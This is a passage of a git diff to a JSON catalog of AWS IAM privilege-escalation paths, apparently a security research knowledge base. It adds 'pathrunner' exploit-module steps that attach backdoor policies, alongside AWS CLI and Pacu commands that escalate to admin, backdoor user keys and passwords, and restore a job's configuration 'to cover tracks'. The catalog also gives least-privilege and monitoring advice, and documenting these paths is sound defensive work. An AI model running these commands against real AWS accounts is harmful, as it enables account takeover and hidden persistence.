+          "description": "Load the ecs-008 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set CLUSTER_NAME target-ecs-cluster",
+          "description": "Set the CLUSTER_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set TASK_DEFINITION target-task-def:1",
+          "description": "Set the TASK_DEFINITION option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 8,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -10246,8 +11615,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -10348,6 +11722,53 @@
           "step": 6,
           "command": "aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN",
           "description": "Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ecs-009",
+          "description": "Load the ecs-009 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set CLUSTER_NAME target-ecs-cluster",
+          "description": "Set the CLUSTER_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set CONTAINER_INSTANCE_ARN arn:aws:ecs::123456789012:container-instance/target-ecs-cluster/abc1234567890",
+          "description": "Set the CONTAINER_INSTANCE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner set TASK_DEFINITION target-task-def:1",
+          "description": "Set the TASK_DEFINITION option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 8,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 9,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -10474,8 +11895,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -10557,6 +11983,43 @@
           "step": 3,
           "command": "aws emr describe-cluster \\\n  --cluster-id CLUSTER_ID \\\n  --query 'Cluster.Status.StateChangeReason' \\\n  --output json\n",
           "description": "If the cluster fails, check StateChangeReason for diagnostic information about what prevented the step from executing."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use emr-001",
+          "description": "Load the emr-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set INSTANCE_PROFILE arn:aws:iam::123456789012:instance-profile/TargetInstanceProfile",
+          "description": "Set the INSTANCE_PROFILE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set SERVICE_ROLE arn:aws:iam::123456789012:role/TargetServiceRole",
+          "description": "Set the SERVICE_ROLE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -10697,8 +12160,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -10790,6 +12258,23 @@
           "step": 5,
           "command": "aws emr-serverless get-job-run \\\n  --application-id APPLICATION_ID \\\n  --job-run-id JOB_RUN_ID \\\n  --query 'jobRun.state' \\\n  --output text\n",
           "description": "Poll job run status until it reaches SUCCESS, confirming the privilege escalation has completed."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use emrserverless-001",
+          "description": "Load the emrserverless-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set EXECUTION_ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the EXECUTION_ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -10918,8 +12403,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -11015,6 +12505,38 @@
           "step": 4,
           "command": "aws gamelift create-fleet \\\n  --name privesc-fleet \\\n  --build-id BUILD_ID \\\n  --compute-type EC2 \\\n  --ec2-instance-type c5.large \\\n  --fleet-type ON_DEMAND \\\n  --instance-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \\\n  --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \\\n  --runtime-configuration '{\n    \"ServerProcesses\": [{\n      \"LaunchPath\": \"/local/game/gameserver.sh\",\n      \"ConcurrentExecutions\": 1\n    }]\n  }'\n",
           "description": "Create a GameLift fleet with the admin IAM instance role, using SHARED_CREDENTIAL_FILE to make the role credentials available to the game server process. The server starts automatically and escalates privileges."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use gamelift-001",
+          "description": "Load the gamelift-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -11155,8 +12677,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -11415,6 +12942,23 @@
           "command": "ssh glue@ENDPOINT_ADDRESS",
           "description": "SSH into the dev endpoint and execute code with elevated privileges"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use glue-001",
+          "description": "Load the glue-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "recommendation": "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid administrative service roles** - Very rarely does a Glue dev endpoint need administrative access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificGlueRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual Glue dev endpoint creation followed by immediate access\n- Monitor CloudTrail for dev endpoint creation by principals who do not usually create endpoints\n- Monitor CloudTrail for roles being passed to Glue that haven't been used before\n- Monitor and alert on Glue dev endpoint creation with privileged roles\n- Regularly audit Glue dev endpoints for excessive IAM permissions\n- Regularly audit all IAM roles that trust the Glue service and down-scope any roles with administrative access\n",
@@ -11589,8 +13133,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -11908,6 +13457,38 @@
           "command": "# Wait 15 seconds for IAM policy propagation\nsleep 15\n# Verify admin access\naws iam list-users\n",
           "description": "After the job completes and IAM changes propagate, verify that you now have administrative permissions by executing a privileged operation."
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use glue-003",
+          "description": "Load the glue-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "recommendation": "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid administrative service roles** - Very rarely does a Glue job need administrative access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificGlueRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual Glue job creation followed by immediate execution\n- Monitor CloudTrail for Glue job creation by principals who do not usually create jobs\n- Monitor CloudTrail for roles being passed to Glue that haven't been used before\n- Monitor and alert on Glue job creation with privileged roles\n- Regularly audit Glue jobs for excessive IAM permissions\n- Regularly audit all IAM roles that trust the Glue service and down-scope any roles with administrative access\n",
@@ -12062,8 +13643,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -12171,6 +13757,38 @@
           "step": 6,
           "command": "# Wait 15 seconds for IAM policy propagation\nsleep 15\n# Verify admin access\naws iam list-users\n",
           "description": "After the job completes and IAM changes propagate, verify that you now have administrative permissions. Note that the trigger will continue to run every minute, re-granting access even if it's removed."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use glue-004",
+          "description": "Load the glue-004 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -12326,8 +13944,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -12447,6 +14070,43 @@
           "step": 8,
           "command": "# Optional: Restore original job configuration to cover tracks\naws glue update-job \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --job-update \"Role=arn:aws:iam::ACCOUNT_ID:role/ORIGINAL_ROLE,Command={Name=pythonshell,ScriptLocation=s3://original-bucket/original_script.py,PythonVersion=3.9}\"\n",
           "description": "Optionally restore the job to its original configuration to reduce the likelihood of detection. Use the values you documented in step 2."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use glue-005",
+          "description": "Load the glue-005 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set JOB_NAME target-glue-job",
+          "description": "Set the JOB_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -12593,8 +14253,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -12718,6 +14383,43 @@
           "step": 8,
           "command": "# Wait 15 seconds for IAM policy propagation\nsleep 15\n# Verify admin access\naws iam list-users\n",
           "description": "After the job completes and IAM changes propagate, verify that you now have administrative permissions. Note that the trigger will continue to run every minute, re-granting access even if it's removed, establishing persistent administrative access."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use glue-006",
+          "description": "Load the glue-006 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set JOB_NAME target-glue-job",
+          "description": "Set the JOB_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -12864,8 +14566,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -12954,6 +14661,38 @@
           "step": 5,
           "command": "aws iam list-attached-user-policies \\\n  --user-name STARTING_USER\n",
           "description": "Verify that AdministratorAccess is now attached to the starting user, confirming privilege escalation success."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use glue-007",
+          "description": "Load the glue-007 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -13092,8 +14831,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -13126,6 +14870,23 @@
           "step": 1,
           "command": "aws iam create-policy-version --policy-arn @arn --policy-document file://admin_policy.json --set-as-default",
           "description": "Create a new policy version with administrative permissions and set it as default"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-001",
+          "description": "Load the iam-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set POLICY_ARN arn:aws:iam::123456789012:policy/TargetPolicy",
+          "description": "Set the POLICY_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -13236,8 +14997,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -13293,6 +15059,23 @@
           "step": 2,
           "command": "run iam__backdoor_users_keys --usernames [TARGET_USER]",
           "description": "Create access key for target user"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-002",
+          "description": "Load the iam-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_USER target-iam-user",
+          "description": "Set the TARGET_USER option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -13453,8 +15236,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -13507,6 +15295,23 @@
           "step": 4,
           "command": "aws configure --profile target-user",
           "description": "Configure AWS CLI with the newly created access key"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-003",
+          "description": "Load the iam-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_USER target-iam-user",
+          "description": "Set the TARGET_USER option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -13670,8 +15475,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -13717,6 +15527,23 @@
           "step": 1,
           "command": "run iam__backdoor_users_password --usernames [TARGET_USER]",
           "description": "Creates a password for the target user"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-004",
+          "description": "Load the iam-004 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_USER target-iam-user",
+          "description": "Set the TARGET_USER option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -13870,8 +15697,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -13934,6 +15766,18 @@
           "step": 3,
           "command": "aws sts get-caller-identity",
           "description": "Verify the new permissions are active (for self-escalation, credentials remain the same)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-005",
+          "description": "Load the iam-005 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -14021,8 +15865,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -14068,6 +15917,23 @@
           "step": 1,
           "command": "run iam__backdoor_users_password --usernames [TARGET_USER] --update",
           "description": "Updates the password for a user that already has a password"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-006",
+          "description": "Load the iam-006 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_USER target-iam-user",
+          "description": "Set the TARGET_USER option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -14221,8 +16087,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -14255,6 +16126,18 @@
           "step": 2,
           "command": "aws sts get-caller-identity",
           "description": "Verify the new permissions are active (for self-escalation)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-007",
+          "description": "Load the iam-007 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -14357,8 +16240,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -14392,6 +16280,18 @@
           "step": 2,
           "command": "aws sts get-caller-identity",
           "description": "Verify the new permissions are active (for self-escalation)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-008",
+          "description": "Load the iam-008 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -14544,8 +16444,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -14579,6 +16484,18 @@
           "step": 2,
           "command": "aws sts get-caller-identity",
           "description": "Verify the new permissions are active (for self-escalation)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-009",
+          "description": "Load the iam-009 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -14680,8 +16597,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -14716,6 +16638,23 @@
           "step": 2,
           "command": "aws sts get-caller-identity",
           "description": "Verify the new permissions are active"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-010",
+          "description": "Load the iam-010 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set GROUP_NAME target-iam-group",
+          "description": "Set the GROUP_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -14828,8 +16767,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -14863,6 +16807,23 @@
           "step": 2,
